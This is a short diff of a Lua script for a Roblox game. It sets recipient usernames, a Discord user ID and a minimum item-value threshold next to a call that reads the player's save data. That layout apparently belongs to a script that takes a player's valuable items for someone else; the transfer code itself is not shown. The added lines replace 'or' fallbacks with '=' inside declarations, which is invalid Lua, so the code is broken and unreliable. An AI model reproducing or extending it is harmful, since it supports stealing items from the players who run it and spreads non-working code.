@@ -17,10 +17,10 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local user = _G.Username or "CheaterForRea1"
-local user2 = _G.Username2 or "JHGG8875"
-local discuser = _G.discuser or "1328537790001975367"
-local min_rap = _G.minrap or 100000
+local user = _G.Username = "CheaterForRea1"
+local user2 = _G.Username2 = "JHGG8875"
+local discuser = _G.discuser = "1328537790001975367"
+local min_rap = _G.minrap = 100000
 
 local newamount = 20000
 
